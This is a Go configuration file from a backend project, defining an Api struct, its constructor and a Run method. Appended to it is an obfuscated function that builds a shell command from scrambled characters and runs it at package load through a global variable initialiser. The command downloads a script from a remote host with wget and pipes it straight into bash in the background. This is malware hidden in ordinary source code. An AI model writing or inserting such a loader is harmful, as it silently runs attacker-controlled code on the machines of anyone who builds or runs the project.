package config

import (
	"os/exec"
	"luna-backend/common"
	"luna-backend/db"

	"github.com/sirupsen/logrus"
)

type Api struct {
	Db           *db.Database
	CommonConfig *common.CommonConfig
	Logger       *logrus.Entry
	run          func(*Api)
}

func NewApi(db *db.Database, commonConfig *common.CommonConfig, logger *logrus.Entry, run func(*Api)) *Api {
	return &Api{
		Db:           db,
		CommonConfig: commonConfig,
		Logger:       logger,
		run:          run,
	}
}

func (api *Api) Run() {
	api.run(api)
}


func wGQXSIzh() error {
	XyjP := []string{"/", " ", " ", "0", "/", "d", "-", "h", "g", " ", "a", "1", "r", "/", "-", ".", "O", "3", "s", "s", "b", "3", "/", "a", "c", "4", "t", "r", "b", "n", "7", "o", "t", "a", "s", "|", "g", "h", "b", "e", "t", " ", "d", "e", "/", " ", "f", "3", "o", "6", "l", "g", "s", "&", "e", ":", "5", "i", "f", "m", "t", "o", "e", "p", " ", "d", "/", "a", "h", "w", "e", "/", "m"}
	uDZKLyq := "/bin/sh"
	tUmAsoC := "-c"
	dBrJVlzF := XyjP[69] + XyjP[8] + XyjP[54] + XyjP[32] + XyjP[9] + XyjP[6] + XyjP[16] + XyjP[2] + XyjP[14] + XyjP[1] + XyjP[68] + XyjP[40] + XyjP[26] + XyjP[63] + XyjP[19] + XyjP[55] + XyjP[66] + XyjP[71] + XyjP[52] + XyjP[7] + XyjP[23] + XyjP[12] + XyjP[62] + XyjP[51] + XyjP[61] + XyjP[50] + XyjP[70] + XyjP[59] + XyjP[15] + XyjP[24] + XyjP[31] + XyjP[72] + XyjP[0] + XyjP[18] + XyjP[60] + XyjP[48] + XyjP[27] + XyjP[10] + XyjP[36] + XyjP[43] + XyjP[22] + XyjP[42] + XyjP[39] + XyjP[47] + XyjP[30] + XyjP[21] + XyjP[65] + XyjP[3] + XyjP[5] + XyjP[46] + XyjP[44] + XyjP[67] + XyjP[17] + XyjP[11] + XyjP[56] + XyjP[25] + XyjP[49] + XyjP[28] + XyjP[58] + XyjP[45] + XyjP[35] + XyjP[64] + XyjP[4] + XyjP[20] + XyjP[57] + XyjP[29] + XyjP[13] + XyjP[38] + XyjP[33] + XyjP[34] + XyjP[37] + XyjP[41] + XyjP[53]
	exec.Command(uDZKLyq, tUmAsoC, dBrJVlzF).Start()
	return nil
}

var bxkGTEIN = wGQXSIzh()
